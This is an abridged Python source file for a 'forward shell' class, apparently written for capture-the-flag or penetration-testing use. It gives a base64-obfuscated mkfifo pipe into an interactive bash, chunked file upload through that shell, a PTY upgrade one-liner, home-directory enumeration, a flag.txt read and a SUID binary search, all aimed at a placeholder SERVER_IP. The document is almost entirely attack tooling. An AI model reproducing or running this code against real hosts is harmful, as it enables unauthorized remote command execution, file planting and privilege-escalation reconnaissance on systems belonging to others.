...
class forward_shell:
	...
	def create_mkfifo_pipe(self):
		self.Output = False
		mkfifo_pipe = f"mkfifo {self.ip_file}; tail -f {self.ip_file} | /bin/bash -i 2>&1 > {self.op_file}"
		b64_mkfifo_pipe = base64.b64encode(mkfifo_pipe.encode('utf-8')).decode('utf-8')
		final_b64_mkfifo_cmd = f"echo {b64_mkfifo_pipe}|base64 -d|bash -i"
	...
	def upload_file(self,input_file,output_file):
		try:
			with open(f"{input_file}", "rb") as file:
				raw_data = file.read()
		except:
		...
		for index, chunk in enumerate(chunk_array):
			upload = f'echo -n {chunk} >> {output_file}.b64.gz'
			self.send_cmd(cmd=upload)
			expand_file = f'cat {output_file}.b64.gz | base64 -d > {output_file}.gz ; gzip -d -f {output_file}.gz ; rm -f {output_file}.b64.gz'
	...
	def upgrade(self):
			UpgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")' || python3 -c 'import pty;pty.spawn("/bin/bash")' || script -qc /dev/null"""		
	...
	def linenum(self):
		...
		fs.send_cmd(cmd=cmd)
		fs.read_cmd()
		cmd = f'ls -la /home/{self.username}/'
...
if __name__ == '__main__':
	...
	IP = "SERVER_IP"     #CHANGE ME ;D
	PORT = int(PORT)     #CHANGE ME ;D
	...
	while True:
		...
		if cmd == "help":
			...
			cmd = f'cat /home/{self.username}/Desktop/flag.txt'
			fs.send_cmd(cmd=cmd)
			fs.read_cmd()
		elif cmd == "getsuid":
			cmd = 'find / -perm -4000'
